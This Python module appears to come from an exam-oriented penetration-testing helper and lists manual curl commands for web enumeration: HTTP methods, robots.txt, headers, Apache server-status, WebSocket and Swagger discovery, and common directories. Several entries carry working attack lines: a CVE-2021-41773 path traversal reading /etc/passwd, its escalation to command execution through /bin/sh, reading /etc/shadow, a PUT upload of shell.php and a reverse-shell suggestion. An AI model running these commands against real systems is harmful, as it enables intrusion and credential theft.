"""
Web Enumeration Alternative Commands

Manual alternatives for HTTP enumeration, directory discovery, and web testing.
Extracted from http.py, apache.py, and api_attacks.py plugins.
"""

from ..models import AlternativeCommand, Variable


ALTERNATIVES = [
    # ======================================================================
    # HTTP METHODS ENUMERATION (Manual Alternative to Nmap NSE)
    # ======================================================================
    AlternativeCommand(
        id='alt-http-methods-manual',
        name='Manual HTTP Methods Enumeration',
        command_template='curl -X OPTIONS -i http://<TARGET>:<PORT>/',
        description='Manually enumerate HTTP methods using OPTIONS request (alternative to nmap http-methods script)',
        category='web-enumeration',
        subcategory='http-methods',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '-X OPTIONS': 'Specify HTTP method (OPTIONS reveals supported methods)',
            '-i': 'Include HTTP headers in output (where Allow header shows methods)',
            'curl': 'Command-line HTTP client'
        },
        tags=['MANUAL', 'QUICK_WIN', 'OSCP:HIGH', 'NO_TOOLS'],
        os_type='both',
        success_indicators=[
            'Allow: GET, POST, PUT, DELETE, TRACE, OPTIONS header visible',
            'HTTP 200 or 204 response',
            'Methods enumerated successfully'
        ],
        failure_indicators=[
            'OPTIONS method disabled (HTTP 405)',
            'No Allow header in response',
            'Connection refused'
        ],
        next_steps=[
            'Test each method individually: curl -X TRACE -i http://TARGET:PORT/',
            'If PUT enabled: Attempt file upload (curl -X PUT -d @shell.php http://TARGET:PORT/shell.php)',
            'If TRACE enabled: Test for XST vulnerability',
            'If DELETE enabled: Test file deletion'
        ],
        parent_task_pattern='http-*'
    ),

    # ======================================================================
    # TRACE METHOD TESTING (XST Detection)
    # ======================================================================
    AlternativeCommand(
        id='alt-http-trace-xst',
        name='Manual TRACE Method Test (XST)',
        command_template='curl -X TRACE -i http://<TARGET>:<PORT>/',
        description='Test if TRACE method is enabled (Cross-Site Tracing vulnerability - bypasses httpOnly cookies)',
        category='web-enumeration',
        subcategory='http-methods',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '-X TRACE': 'Test TRACE method (echoes request back)',
            '-i': 'Include headers (shows if request is echoed)',
            'TRACE': 'HTTP method that echoes received request (XST vector)'
        },
        tags=['MANUAL', 'QUICK_WIN', 'OSCP:MEDIUM', 'VULN_SCAN'],
        os_type='both',
        success_indicators=[
            'HTTP 200 status',
            'Request echoed in response body',
            'Headers reflected back'
        ],
        failure_indicators=[
            'HTTP 405 Method Not Allowed',
            'TRACE disabled (expected on hardened servers)',
            'No echo in response'
        ],
        next_steps=[
            'Document as medium-severity finding',
            'Test XSS + TRACE combination for cookie theft',
            'Recommend disabling TRACE in web server config'
        ],
        parent_task_pattern='http-*'
    ),

    # ======================================================================
    # ROBOTS.TXT ENUMERATION
    # ======================================================================
    AlternativeCommand(
        id='alt-robots-check',
        name='Check robots.txt',
        command_template='curl http://<TARGET>:<PORT>/robots.txt',
        description='Manually check robots.txt for disallowed paths (quick win for hidden directories)',
        category='web-enumeration',
        subcategory='information-disclosure',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            'curl': 'HTTP client for manual requests',
            '/robots.txt': 'Standard location for robots exclusion file'
        },
        tags=['MANUAL', 'QUICK_WIN', 'OSCP:HIGH', 'NO_TOOLS'],
        os_type='both',
        success_indicators=[
            'HTTP 200 response',
            'Disallow entries found',
            'Hidden directories revealed'
        ],
        failure_indicators=[
            'HTTP 404 Not Found',
            'Empty robots.txt',
            'No disallowed paths'
        ],
        next_steps=[
            'Test each Disallow entry manually: curl http://TARGET:PORT/admin',
            'Check for /backup, /admin, /config paths',
            'Document discovered paths for further testing'
        ],
        parent_task_pattern='http-*'
    ),

    # ======================================================================
    # HTTP HEADERS INSPECTION
    # ======================================================================
    AlternativeCommand(
        id='alt-http-headers-inspect',
        name='Inspect HTTP Response Headers',
        command_template='curl -I http://<TARGET>:<PORT>/',
        description='Manually inspect HTTP headers for server version, security headers, and misconfigurations',
        category='web-enumeration',
        subcategory='fingerprinting',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '-I': 'Fetch headers only (HEAD request - fast)',
            'curl': 'HTTP client'
        },
        tags=['MANUAL', 'QUICK_WIN', 'OSCP:HIGH', 'NO_TOOLS'],
        os_type='both',
        success_indicators=[
            'Server version revealed (Server: Apache/2.4.41)',
            'X-Powered-By header shows technology (PHP, ASP.NET)',
            'Security headers analyzed',
            'Cookie attributes visible'
        ],
        failure_indicators=[
            'Connection refused',
            'Headers obfuscated',
            'Minimal information disclosure'
        ],
        next_steps=[
            'Research Server version for CVEs: searchsploit "Apache 2.4.41"',
            'Check for missing security headers (X-Frame-Options, CSP)',
            'Note Set-Cookie flags (HttpOnly, Secure)',
            'Test X-Powered-By technology for vulnerabilities'
        ],
        parent_task_pattern='http-*'
    ),

    # ======================================================================
    # APACHE SERVER-STATUS EXPOSURE
    # ======================================================================
    AlternativeCommand(
        id='alt-apache-server-status',
        name='Check Apache server-status',
        command_template='curl -i http://<TARGET>:<PORT>/server-status',
        description='Check for exposed Apache server-status page (reveals active connections, URLs, client IPs)',
        category='web-enumeration',
        subcategory='information-disclosure',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '/server-status': 'Apache mod_status endpoint',
            '-i': 'Include headers in output'
        },
        tags=['MANUAL', 'QUICK_WIN', 'OSCP:MEDIUM', 'INFO_DISCLOSURE'],
        os_type='both',
        success_indicators=[
            'HTTP 200 response',
            'Apache Server Status page visible',
            'Active connections listed',
            'URLs and IPs exposed'
        ],
        failure_indicators=[
            'HTTP 403 Forbidden (access restricted)',
            'HTTP 404 Not Found (disabled)',
            'mod_status not enabled'
        ],
        next_steps=[
            'Monitor for sensitive URLs in requests',
            'Harvest internal IP addresses',
            'Check /server-status?auto for machine-readable format',
            'Document information disclosure vulnerability'
        ],
        parent_task_pattern='apache-*'
    ),

    # ======================================================================
    # WEBSOCKET ENDPOINT DISCOVERY
    # ======================================================================
    AlternativeCommand(
        id='alt-websocket-discover',
        name='Manual WebSocket Endpoint Discovery',
        command_template='curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: test" http://<TARGET>:<PORT>/ws',
        description='Manually test for WebSocket endpoints using upgrade handshake (alternative to websocat)',
        category='web-enumeration',
        subcategory='websocket',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '-N': 'No buffering (for streaming connections)',
            '-H "Connection: Upgrade"': 'Initiate protocol upgrade',
            '-H "Upgrade: websocket"': 'Request WebSocket protocol',
            '-H "Sec-WebSocket-Version: 13"': 'WebSocket protocol version',
            '-H "Sec-WebSocket-Key: test"': 'Handshake key (any base64 string works)'
        },
        tags=['MANUAL', 'OSCP:HIGH', 'NO_TOOLS', 'ENUM'],
        os_type='both',
        success_indicators=[
            'HTTP 101 Switching Protocols',
            'Connection: Upgrade header in response',
            'Upgrade: websocket header present',
            'Sec-WebSocket-Accept header visible'
        ],
        failure_indicators=[
            'HTTP 404 Not Found',
            'HTTP 400 Bad Request',
            'Connection refused',
            'No upgrade response'
        ],
        next_steps=[
            'Test common WS paths: /websocket, /socket.io, /ws/chat, /api/ws',
            'Check page source for WebSocket URLs',
            'Test for CSWSH (Cross-Site WebSocket Hijacking)',
            'Enumerate message structure with websocat'
        ],
        parent_task_pattern='api-*'
    ),

    # ======================================================================
    # REST API DOCUMENTATION DISCOVERY
    # ======================================================================
    AlternativeCommand(
        id='alt-api-docs-discover',
        name='Manual API Documentation Discovery',
        command_template='curl -s http://<TARGET>:<PORT>/swagger.json | head -20',
        description='Manually discover API documentation (Swagger/OpenAPI) - reveals all endpoints and schemas',
        category='web-enumeration',
        subcategory='api-discovery',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '-s': 'Silent mode (no progress bar)',
            '/swagger.json': 'Swagger API specification location',
            'head -20': 'Show first 20 lines for quick inspection'
        },
        tags=['MANUAL', 'QUICK_WIN', 'OSCP:HIGH', 'NO_TOOLS'],
        os_type='both',
        success_indicators=[
            'JSON API specification retrieved',
            'Paths field lists all endpoints',
            'Authentication schemes documented',
            'Request/response schemas visible'
        ],
        failure_indicators=[
            'HTTP 404 Not Found',
            'Empty response',
            'Authentication required'
        ],
        next_steps=[
            'Test other paths: /openapi.json, /api-docs, /swagger-ui, /redoc',
            'Download full spec: curl http://TARGET:PORT/swagger.json -o api-spec.json',
            'Enumerate all documented endpoints',
            'Test for undocumented endpoints',
            'Look for admin/debug APIs in documentation'
        ],
        parent_task_pattern='api-*'
    ),

    # ======================================================================
    # APACHE CVE-2021-41773 PATH TRAVERSAL (QUICK WIN)
    # ======================================================================
    AlternativeCommand(
        id='alt-apache-cve-2021-41773',
        name='Apache CVE-2021-41773 Path Traversal Test',
        command_template='curl "http://<TARGET>:<PORT>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"',
        description='Test for Apache 2.4.49/2.4.50 path traversal vulnerability (quick win for file read)',
        category='web-enumeration',
        subcategory='vulnerability-scan',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            '.%2e': 'URL-encoded dot (bypasses path normalization)',
            '/cgi-bin/': 'Common CGI directory',
            '/etc/passwd': 'Test file for path traversal'
        },
        tags=['EXPLOIT', 'QUICK_WIN', 'OSCP:HIGH', 'CVE'],
        os_type='both',
        success_indicators=[
            '/etc/passwd contents visible',
            'HTTP 200 status',
            'File read successful'
        ],
        failure_indicators=[
            'HTTP 404 Not Found',
            'HTTP 403 Forbidden (patched)',
            'Empty response'
        ],
        next_steps=[
            'Escalate to RCE: curl --data "echo Content-Type: text/plain; echo; id" http://TARGET:PORT/cgi-bin/.%2e/.%2e/.%2e/bin/sh',
            'Read sensitive files: /etc/shadow, /var/www/html/config.php',
            'Upgrade to reverse shell if RCE works'
        ],
        parent_task_pattern='apache-*'
    ),

    # ======================================================================
    # MANUAL DIRECTORY TESTING (NO TOOLS)
    # ======================================================================
    AlternativeCommand(
        id='alt-manual-dir-check',
        name='Manual Directory Enumeration (No Tools)',
        command_template='for dir in admin upload backup config login wp-admin phpmyadmin; do curl -s -o /dev/null -w "%{http_code} http://<TARGET>:<PORT>/$dir\\n" http://<TARGET>:<PORT>/$dir; done',
        description='Manually test common directories without tools (pure bash alternative to gobuster)',
        category='web-enumeration',
        subcategory='directory-enum',
        variables=[
            Variable(
                name='TARGET',
                description='Target IP or hostname',
                example='192.168.45.100',
                auto_resolve=True,
                required=True
            ),
            Variable(
                name='PORT',
                description='HTTP port',
                example='80',
                auto_resolve=True,
                required=True
            )
        ],
        flag_explanations={
            'for dir in ...': 'Loop through common directory names',
            '-s': 'Silent mode (no progress)',
            '-o /dev/null': 'Discard response body',
            '-w "%{http_code}"': 'Output only HTTP status code',
            'curl': 'HTTP client'
        },
        tags=['MANUAL', 'NO_TOOLS', 'OSCP:HIGH', 'ENUM'],
        os_type='both',
        success_indicators=[
            'HTTP 200, 301, 302 status codes (directories exist)',
            'HTTP 401 (auth required - interesting)',
            'Discovered directories'
        ],
        failure_indicators=[
            'All return HTTP 404',
            'Connection issues'
        ],
        next_steps=[
            'Browse discovered directories manually',
            'Test for upload functionality',
            'Check for admin panels',
            'Expand wordlist: /api, /uploads, /files, /dashboard, /manager'
        ],
        parent_task_pattern='http-*'
    ),
]
